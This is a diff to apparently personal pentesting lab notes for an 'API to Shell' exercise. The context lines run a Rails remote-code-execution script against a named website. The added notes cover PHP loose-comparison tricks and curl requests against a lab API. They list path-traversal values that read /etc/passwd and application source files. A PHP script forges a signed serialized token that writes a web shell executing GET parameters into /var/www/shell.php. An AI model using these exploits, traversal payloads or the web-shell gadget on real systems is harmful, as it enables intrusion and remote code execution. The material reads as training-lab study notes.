@@ -71,3 +71,84 @@ run.exec(commands );
 - gem install ronin-support
 - curl https://gist.githubusercontent.com/postmodern/4499206/raw/a68d6ff8c1f9570a09365036aeb96f6a9fff7121/rails_rce.rb -o rails_rce.rb
 - ruby rails_rce.rb https://pelotascore.com/ '`cat /etc/password`'
+
+#### API to SHell
+
+###### PHP COMPARISONS
+
+```
+bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )
+```
+
+```
+<?php
+var_dump("1" === 1);
+var_dump("1" == 1);
+var_dump("a" == 0);
+var_dump("1' or 1=1" == 1);
+var_dump("<script>alert(1)</script>" == 0);
+?>
+```
+
+###### Register
+
+`curl -x 127.0.0.1:8080 -X POST -H "Content-Type: application/json" -d '{"username":"goenix","password":"password"}' <RHOST>/register`
+
+###### Login
+```
+curl -X POST -H "Content-Type: application/json" -d '{"username":"goenix","password":"password"}' http://ptl-f4162c00-c3706b0f.libcurl.so/login
+```
+
+###### List Files
+
+`curl -X POST -H "Content-Type: application/json" -d '{"token":"$token"}' <RHOST>/files`
+
+
+###### Upload a file
+
+`curl -X POST -H "Content-Type: application/json" -d '{ "token": "$token", "filename": "hello.txt", "content": "Hello Everyone"}' <RHOST>/upload`
+
+###### Retrieve a file
+
+`curl -x 127.0.0.1:8080 -X POST -H "Content-Type: application/json" -d '{ "token": "$token", "uuid": "$uuid", "sig": 0}' <RHOST>/file`
+#
+- *uuid(s):*
+- ../../../../../../etc/passwd
+- ./../../../.././var/www/index.php
+- ../../../../.././var/www/router.php
+- ../../../../.././var/www/classes/db.php
+- ../../../../.././var/www/classes/user.php
+- ../../../../../././././var/www/classes/file.php
+- ../../../../../././var/www/classes/utils.php
+#
+- VIM REGEX FORMATTING => /\\n/^M/g
+#
+- From serialization to code execution => trampoline functions or gadgets
+- __wakeup() when an object is deserialized.
+- __destruct() when an object is deleted.
+- __toString() when an object is converted to a string.
+#
+```
+<?php
+
+define('KEY', "ooghie1Z Fae8aish OhT3fie6 Gae2aiza");
+
+function sign($data) {
+  return hash_hmac('md5', $data, KEY);
+}
+
+function tokenize($user) {
+  $token = urlencode(base64_encode(serialize($user)));
+  $token.= "--".sign($token);
+  return $token;
+}
+
+class File {
+  public $owner,$uuid='<?php system($_GET["c"]); ?>';
+  public $logfile = "/var/www/shell.php";
+}
+
+echo tokenize(new File());
+
+?>
+```
